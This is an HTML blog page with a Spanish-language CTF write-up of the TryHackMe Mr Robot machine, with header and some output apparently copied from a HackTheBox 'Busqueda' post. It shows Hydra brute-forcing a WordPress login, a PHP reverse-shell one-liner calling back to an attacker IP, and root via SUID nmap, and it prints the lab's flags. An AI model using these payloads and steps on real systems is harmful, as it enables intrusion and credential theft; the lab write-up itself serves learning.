@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup TryHackMe Mr Robot CTF by Pol Nebot Blázquez</title>
+
+  <meta name="description" content="Resolución de la máquina Mr Robot CTF de la plataforma de TryHackMe">
+  <meta name="author" content="Pol Nebot Blázquez">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup TryHackMe Mr Robot CTF">
+  <meta name="twitter:description" content="Resolución de la máquina Mr Robot CTF de la plataforma de TryHackMe">
+  <meta name="twitter:creator" content="PolLOL_">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/nebotp/Imagenes-Repositorios/main/ni/busqueda.png" />
+
+  <meta property="og:site_name" content="nebotp" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup TryHackMe Mr Robot CTF">
+  <meta property="og:description" content="Resolución de la máquina Mr Robot CTF de la plataforma de TryHackMe">
+  <meta property="og:image" content="https://raw.githubusercontent.com/nebotp/Imagenes-Repositorios/main/ni/busqueda.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/nebotp/Imagenes-Repositorios/main/ni/busqueda.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup TryHackMe Mr Robot CTF" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="nebotp">
+          <h1 class="panel-cover__title panel-title scale-up-center">Pol Nebot Blázquez</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/thm" title="Pol Nebot Blázquez" class="blog-button">TryHackMe</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/nebotp" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/PolLOL_" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/polnb_" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:pol.nebotb@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#bf">Brute Force con Hydra</a></li>
+        <li><a href="#rshell">Reverse Shell en PHP</a></li>
+        <li><a href="#espriv">Escalada de privilegios</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h2>
+    <picture><img src="https://raw.githubusercontent.com/nebotp/Imagenes-Repositorios/main/ni/busqueda.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Busqueda</h2><br>
+  </header>
+
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code></p>
+<p class="plain-text">Lo primero que vemos es que el puerto <code class="language-plaintext highlighter-rouge">22</code> tiene el servicio <code class="language-plaintext highlighter-rouge">ssh</code> pero está cerrado.</p>
+<p class="plain-text">También podemos observar que en el puerto <code class="language-plaintext highlighter-rouge">80</code> hay un servicio <code class="language-plaintext highlighter-rouge">http</code></p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap</span><code>sS -sV -T4 -v -p-</code><span class="p"> 10.10.11.208
+Nmap scan report for 10.10.11.208
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.52
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Una vez que hemos comprovado que existe una página web, vamos a utilizar la herramienta <code class="language-plaintext highlighter-rouge">dirb</code> que nos ayudará a escanearla para descubrir
+nuevos ficheros y directorios existentes.</p>
+<br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">> dirb</span><span class="p"> http://10.10.0.164
+---- Scanning URL: http://10.10.0.164/ ----
+==> DIRECTORY: http://10.10.0.164/0/
+==> DIRECTORY: http://10.10.0.164/admin/
+==> DIRECTORY: http://10.10.0.164/dashboard
+==> DIRECTORY: http://10.10.0.164/login
+==> DIRECTORY: http://10.10.0.164/robots
+==> DIRECTORY: http://10.10.0.164/video
+==> DIRECTORY: http://10.10.0.164/license </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Hemos encontrado varios directorios que parecen interesantes y que nos pueden ayudar a saber por dónde seguir, vamos a inspeccionarlos.
+<br><h3 style="color: white;">Directorio atom</h3><br>
+<a href="/thm/mrrobot/1.png" target="_blank"><div><p><img src="/thm/mrrobot/1.png"></p></div></a>
+<a href="/thm/mrrobot/2.png" target="_blank"><div><p><img src="/thm/mrrobot/2.png"></p></div></a>
+
+<p class="plain-text">Al acceder a este directorio se nos descarga un archivo con formato .atom, en el, sólo encontramos el código de la página Wordpress aunque nos da algo de información útil como la versión de este: <code class="language-plaintext highlighter-rouge">4.3.1</code></p>
+
+<br><h3 style="color: white;">Directorio login</h3><br>
+<a href="/thm/mrrobot/3.png" target="_blank"><div><p><img src="/thm/mrrobot/3.png"></p></div></a>
+<p class="plain-text">Se nos redirige automáticamente al directorio <code class="language-plaintext highlighter-rouge">"/wp-login.php"</code>, este nos será de gran ayuda para poder acceder a la administración de la web si conseguimos las credenciales necesarias.</p>
+
+<br><h3 style="color: white;">Directorio robots</h3><br>
+<a href="/thm/mrrobot/4.png" target="_blank"><div><p><img src="/thm/mrrobot/4.png"></p></div></a>
+<p class="plain-text">Una vez cargado el directorio este nos muestra el contenido del archivo <code class="language-plaintext highlighter-rouge">robots.txt</code>, realmente este archivo lo tendríamos que comprobar siempre, independientemente de si una herramienta de análisis nos lo muestra
+ya que suele estar en todas las páginas webs y en el se especifican directorios y archivos que no se desean indexar.</p>
+<p class="plain-text">¡Sorpresa! Parece que hemos encontrado la primera key además de lo que parece ser un diccionario que contiene valores que podrían actuar como nombres de usuario y/o contraseñas.</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">10.10.0.164/key-1-of-3.txt </span><span class="ve">
+073403c8a58a1f80d943455fb30724b9</span>
+</code></pre></div></div><br>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">10.10.0.164/fsocity.dic </span></code></pre></div></div><br>
+<a href="/thm/mrrobot/5.png" target="_blank"><div><p><img src="/thm/mrrobot/5.png"></p></div></a>
+
+<section class="post" id="bf">
+<br><h3 class="post-title">Brute Force con Hydra</h3><br>
+
+<p class="plain-text">Ahora vamos a volver de nuevo al directorio <code class="language-plaintext highlighter-rouge">/wp-login.php</code> probamos diferentes usuarios y contraseñas comunes para ver si hay suerte como <code class="language-plaintext highlighter-rouge">admin:admin</code> 
+pero nada, lo que si podemos apreciar es que Wordpress nos muestra un mensaje de error cuando introducimos un usuario que no existe.</p>
+<a href="/thm/mrrobot/6.png" target="_blank"><div><p><img src="/thm/mrrobot/6.png"></p></div></a>
+<p class="plain-text">Esto es algo que podemos aprovechar mediante el uso de la herramienta <code class="language-plaintext highlighter-rouge">Hydra</code> con ella podremos 
+realizar un ataque de fuerza bruta haciendo que vaya descartando nombres de usuarios cada vez que se de el mensaje de error esperado.</p>
+<p class="plain-text">Antes de empezar tendremos que hacer uso del programa <code class="language-plaintext highlighter-rouge">Burp Suite</code> para capturar la <code class="language-plaintext highlighter-rouge">cabecera del mensaje http</code> que se envía a la web en el momento de hacer login, esta tendremos que añadirla dentro del comando <code class="language-plaintext highlighter-rouge">Hydra</code></p>
+<a href="/thm/mrrobot/7.png" target="_blank"><div><p><img src="/thm/mrrobot/7.png"></p></div></a>
+<p class="plain-text">Una vez capturada, cogeremos sólo el siguiente fragmento <code class="language-plaintext highlighter-rouge">log=admin&pwd=2141</code> y lo modificaremos de la siguiente forma: <code class="language-plaintext highlighter-rouge">log=^USER^&pwd=^PWD^</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">> sudo hydra </span><span class="am">-L /root/fsocity.dic -p 1234 10.10.0.164 </span><span class="az">http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username </span>-t 30</span>
+<span class="plain-text">[DATA] attacking http-post-form://10.10.0.164:80/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username</span>
+<span class="plain-text">[<span class="ve">80</span>][<span class="ve">http-post-form</span>] host: <span class="ve">10.10.0.164</span>  login: <span class="ve">Elliot</span>  password: <span class="ve">1234</span></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Vemos que el usuario <code class="language-plaintext highlighter-rouge">Elliot</code> ha sido verificado, a continuación vamos a probarlo en el login.</p>
+<a href="/thm/mrrobot/8.png" target="_blank"><div><p><img src="/thm/mrrobot/8.png"></p></div></a>
+<p class="plain-text">Vaya, parece que efectivamente el usuario existe y podemos ver que el mensaje de error esta vez es diferente. A continuación vamos a volver a lanzar el comando <code class="language-plaintext highlighter-rouge">Hydra</code>pero adaptándolo al nuevo usuario y al nuevo mensaje.</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">> sudo hydra </span><span class="am">-l Elliot -P /root/fsocity.dic 10.10.0.164 </span><span class="az">http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered </span>-t 30</span>
+<span class="plain-text">[DATA] attacking http-post-form://10.10.0.164:80/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username</span>
+<span class="plain-text">[<span class="ve">80</span>][<span class="ve">http-post-form</span>] host: <span class="ve">10.10.0.164</span>  login: <span class="ve">Elliot</span>  password: <span class="ve">ER28-0652</span></span></code>
+</code></pre></div></div><br>
+
+<p class="plain-text">Vamos a probar las credenciales <code class="language-plaintext highlighter-rouge">Elliot:ER28-0652</code> en el login y accederemos al panel de control Wordpress de la página web.</p>
+<a href="/thm/mrrobot/9.png" target="_blank"><div><p><img src="/thm/mrrobot/9.png"></p></div></a>
+
+<p class="plain-text">Antes de seguir me gustaría hacer un pequeño paréntesis para explicar las diferentes opciones usadas anteriormente al lanzar los comandos con la herramienta <code class="language-plaintext highlighter-rouge">Hydra</code></p>
+<p class="plain-text">
+--> <span style="color:green;">-l</span> Para utilizar un nombre de usuario estático <br>
+--> <span style="color:green;">-L</span> Para pasarle un diccionario al programa para que lo recorra probando usuarios <br>
+--> <span style="color:green;">-p</span> Para utilizar una contraseña estática <br>
+--> <span style="color:green;">-P</span> Para pasarle un diccionario al programa para que lo recorra probando contraseñas <br>
+--> <span style="color:green;">^USER^</span> Especificamos en que parte de la cabecera el programa tendrá que meter los nombres de usuario a probar <br>
+--> <span style="color:green;">^PWD^</span> Especificamos en que parte de la cabecera el programa tendrá que meter las contraseñas a probar
+</p>
+
+<section class="post" id="rshell">
+<br><h3 class="post-title">Reverse Shell en PHP</h3><br>
+
+<p class="plain-text">Después de hacer un barrido general por el menú de Wordpress, lo que más llama la atención es que tenemos accesso al editor de código con el que podríamos inyectar código a la web para vulnerarla.
+Al tener accesso a todos los plugins podemos intentar spawnear una <code class="language-plaintext highlighter-rouge">reverse shell</code> a través de la inyección de código malicioso en un plugin que use php.
+</p>
+
+<p class="plain-text">En este caso el elegido ha sido el plugin <code class="language-plaintext highlighter-rouge">Hello Dolly</code> al cual tenemos acceso y funciona con php.</p>
+<a href="/thm/mrrobot/10.png" target="_blank"><div><p><img src="/thm/mrrobot/10.png"></p></div></a>
+<p class="plain-text">Iremos al editor y borraremos su código original dejándolo de la siguiente forma: </p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="az"> >?php $sock=fsockopen("10.11.44.18",4444); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Antes de activar el plugin tenemos que poner el puerto indicado en el script en <code class="language-plaintext highlighter-rouge">modo escucha</code> para ello usaremos la herramienta <code class="language-plaintext highlighter-rouge">pwncat</code> de la siguiente forma: </p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">> pwncat</span> <span class="az">--listen</span> 4444
+</code></pre></div></div><br>
+<p class="plain-text">Una vez preparados activamos el plugin y habremos conseguido spawnear la reverse shell.</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">> pwncat</span> <span class="az">--listen</span> 4444
+/bin/sh: 0: can't access tty; job control turned off
+$whoami
+daemon
+$
+</code></pre></div></div><br>
+
+<p class="plain-text">Hemos obtenido la reverse shell pero es una <code class="language-plaintext highlighter-rouge">shell no interactiva</code> para poder trabajar en ella
+de manera más cómoda y eficiente vamos a proceder a upgradearla con los siguientes comandos:<br>
+python -c 'import pty; pty.spawn("/bin/bash")'<br>
+export TERM=screen-256color</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+$python -c 'import pty; pty.spawn("/bin/bash")'
+daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-admin$ export TERM=screen-256color
+</code></pre></div></div><br>
+<p class="plain-text">Ahora ya podemos proseguir con la búsqueda, vamos a ver que usuarios hay en el sistema y que podemos encontrar en sus directorios personales.</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+daemon@linux:/etc$ cd /home
+cd /home
+daemon@linux:/home$ ls
+robot
+daemon@linux:/home$ cd robot
+daemon@linux:/home/robot$ ls
+key-2-of-3.txt  password.raw-md5
+</code></pre></div></div><br>
+<p class="plain-text">¡Vaya! Parece que hemos encontrado la key2, el único problema es que para ver el contenido del archivo .txt nos pide una contraseña
+ya que ahora mismo estamos actuando desde el daemon y no tenemos ningún tipo de permisos. Una vez visto el contenido del archivo md5 procederemos a <code class="language-plaintext highlighter-rouge">desencriptar el hash</code>
+y a acceder al usuario robot.</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+daemon@linux:/home/robot$ cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+</code></pre></div></div><br>
+<a href="/thm/mrrobot/11.png" target="_blank"><div><p><img src="/thm/mrrobot/11.png"></p></div></a>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+robot@linux:~$ cat key-2-of-3.txt
+<span class="ve">822c73956184f694993bede3eb39f959</span>
+</code></pre></div></div><br>
+
+<section class="post" id="espriv">
+<br><h3 class="post-title">Escalada de privilegios</h3><br>
+
+<p class="plain-text">Después de un rato registrando diferentes directorios del sistema no hemos podido encontrar más pistas, así que vamos a intentar hacer una <code class="language-plaintext highlighter-rouge">escalada de privilegios</code> para ver si desde el usuario root podemos encontrar algo.
+Buscaremos todos los archivos que tengan el <code class="language-plaintext highlighter-rouge">bit SUID</code> activado, el bit de setuid, cuando se establece, permite que el archivo (usualmente un programa ejecutable) se ejecute con los permisos del propietario del archivo en lugar de los permisos del usuario que lo ejecuta. 
+Esto puede ser un problema de seguridad si el archivo pertenece al usuario root.</p>
+<p class="plain-text">Vamos a utilizar el siguiente comando <code class="language-plaintext highlighter-rouge">find / -perm -u=s -type f 2>/dev/null</code> este se utiliza comúnmente en la fase de exploración de una evaluación de seguridad, para identificar programas que podrían ser explotados para escalar privilegios.</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">robot@linux:~$ </span><span class="o">find / -perm -u=s -type f 2>/dev/null</span>
+/bin/ping
+/bin/mount
+/bin/ping6
+/usr/bin/passwd
+/usr/bin/sudo
+<span class="ve">/usr/local/bin/nmap</span>
+robot@linux:~$ ls -la /usr/local/bin/nmap
+<span class="ve">-rwsr-xr-x 1 root root 504736 Nov 13 2015 /usr/local/bin/nmap</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Decidimos hacer la escalada a través de la herramienta nmap para ello consultamos 
+la página web <code class="language-plaintext highlighter-rouge">GTFOBins</code> en la cual podemos encontrar diferentes maneras de eludir restricciones de seguridad locales en sistemas mal configurados a través de programas.</p>
+<p class="plain-text">Comprobamos que efectivamente nmap se encuentra dentro de este grupo de programas vulnerables.  
+
+<a href="/thm/mrrobot/12.png" target="_blank"><div><p><img src="/thm/mrrobot/12.png"></p></div></a>  
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+robot@linux:~$ /usr/local/bin/nmap --version
+<span class="ve">nmap version 3.81</span> ( http://www.insecure.org/nmap/ )
+</code></pre></div></div><br>
+
+<p class="plain-text">Pretendemos spawnear una shell interactiva a través de la ejecución de nmap y al estar haciéndolo como root tomaremos su identidad dentro de la nueva shell.</p>
+<p class="plain-text">Identificamos que la versión de nmap 3.81 está dentro del rango susceptible a violaciones de seguridad mediante el spawneo de shells interactivas así que vamos a ello.</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+robot@linux:~$ nmap --interactive
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h enter for help
+<span class="am">nmap> !sh</span>
+# whoami
+<span class="ve">root</span>
+#
+</code></pre></div></div><br>
+
+<p class="plain-text">¡Voilà! Nos hemos convertido root, ahora tenemos acceso completo al sistema. Lo primero que haremos es acceder a la carpeta root para ver que encontramos dentro.</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+# ls
+key-2-of-3.txt  password.raw-md5
+# cd ..
+# ls
+robot
+# cd ..
+# cd root
+# ls
+firstboot_done  <span class="ve">key-3-of-3.txt</span>
+# cat key-3-of-3.txt
+<span class="ve">04787ddef27c3dee1ee161b21670b4e4</span>
+</code></pre></div></div><br>
+
+
+
+</section>
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - Pol Nebot Blázquez</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
